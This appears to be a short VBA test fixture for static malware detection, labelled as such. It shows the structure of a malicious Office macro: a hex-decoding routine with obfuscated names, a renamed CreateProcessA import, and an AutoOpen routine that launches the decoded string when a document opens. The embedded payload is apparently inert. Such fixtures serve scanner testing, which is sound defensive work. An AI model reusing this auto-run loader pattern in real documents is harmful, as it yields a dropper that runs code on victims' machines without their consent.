' Static detection fixture. Never execute: hex blobs are inert.
Function qzxwplrtnvk(s As String) As String
    Dim abcdqrstuvwx As Long
    Dim zxcvbnmqwerty As String
    Dim poiuytrewqasdf As String
    abcdqrstuvwx = 2
    For i = 1 To Len(s) Step abcdqrstuvwx
        zxcvbnmqwerty = Mid(s, i, abcdqrstuvwx)
        poiuytrewqasdf = poiuytrewqasdf & Mid(zxcvbnmqwerty, abcdqrstuvwx, 1) & Mid(zxcvbnmqwerty, 1, 1)
    Next
    For j = 1 To Len(poiuytrewqasdf)
        qzxwplrtnvk = qzxwplrtnvk & Chr(Val("&h" & Mid(poiuytrewqasdf, j, abcdqrstuvwx)))
        j = j + 1
    Next
End Function

Private Const gxendrk As Long = &H8000000

Private Declare PtrSafe Function nxdbel Lib "kernel32" Alias "CreateProcessA" ( _
    ByVal zqhxf As String, _
    ByVal jwrvzbyeph As String) As Long

Sub AutoOpen()
    Dim brwizmwdhwip As String
    brwizmwdhwip = qzxwplrtnvk("A7D3D2A6F696E68")
    nxdbel vbNullString, brwizmwdhwip
End Sub
